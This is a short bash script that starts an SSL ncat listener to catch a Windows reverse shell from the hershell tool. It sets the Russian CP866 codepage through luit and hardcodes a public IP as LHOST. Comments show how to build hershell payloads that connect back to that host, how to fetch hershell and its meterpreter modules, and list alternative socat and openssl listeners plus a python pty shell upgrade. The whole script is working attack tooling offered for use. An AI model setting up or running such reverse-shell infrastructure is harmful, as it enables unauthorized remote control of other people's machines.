#!/usr/bin/env bash
###########################################################
# luit.ncat.codepage.sh
# This script will run an ncat windows reverse shell with
# setting CP866 codepage by luit fof hershell
###########################################################

### Set variables
LHOST=185.189.12.199 
LPORT=54544

## For MSDOS OEM Russian Codepage
CPPAGE=cp866
CLOCALE=ru_RU.CP866

### Run Payload
export LANG=$CLOCALE

luit -encoding $CPAGE ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp $LPORT

# [Hershell Удаленное управление Windows Linux](https://codeby.net/threads/hershell-instrument-dlya-udalennogo-upravleniya-sistemami-windows-i-linux.65136/?ysclid=mjrowd1fba146352862)
##### To have made hershell payload
# Predifined 64 bit target
# make windows64 LHOST=$LHOST LPORT=$LPORT
# Predifined 64 bit target
# make linux64 LHOST=$LHOST LPORT=$LPORT

## Before has made a project

# git clone https://github.com/lesnuages/hershell
# cd ./hershell/
# make depends
# go mod init shell
# go mod tidy
# go get github.com/lesnuages/hershell/shell
# go get github.com/lesnuages/hershell/meterpreter

### Other Payload
# socat `tty` OPENSSL-LISTEN:$LPORT,reuseaddr,cert=server.pem,key=server.key,verify=0
# openssl-s_server -port $LPORT -verify 0 -cert server.pem -key server.key -listen

# python -c 'import pty;pty.spawn("/bin/bash")'
